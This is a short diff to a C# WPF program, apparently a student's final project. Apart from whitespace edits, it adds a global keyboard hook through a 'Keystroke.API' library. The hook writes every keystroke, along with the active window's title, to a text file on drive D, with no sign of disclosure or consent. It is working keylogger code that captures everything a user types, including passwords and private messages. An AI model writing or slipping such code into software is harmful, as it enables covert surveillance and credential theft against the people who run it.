@@ -14,10 +14,7 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Diagnostics;
 using System.IO;
-
-
-
-
+using Keystroke.API;
 
 namespace AbschlussprojektWPF
 {
@@ -57,7 +54,7 @@ namespace AbschlussprojektWPF
         public wndMain()
         {
             InitializeComponent();
-            
+
 
 
         }
@@ -113,15 +110,20 @@ namespace AbschlussprojektWPF
             }
             else
             {
-                
+
             }
-            
+            using (var api = new KeystrokeAPI())
+            {
+
+                api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + "    "); ; });
+            }
+
 
         }
 
         private void checkCheckBox()
         {
-            if(cbFirefox.IsChecked == true)
+            if (cbFirefox.IsChecked == true)
             {
                 firefox = true;
             }
@@ -367,7 +369,7 @@ namespace AbschlussprojektWPF
             //}
         }
 
- 
+
 
         private void keyDown_logKeys(object sender, KeyEventArgs e)
         {
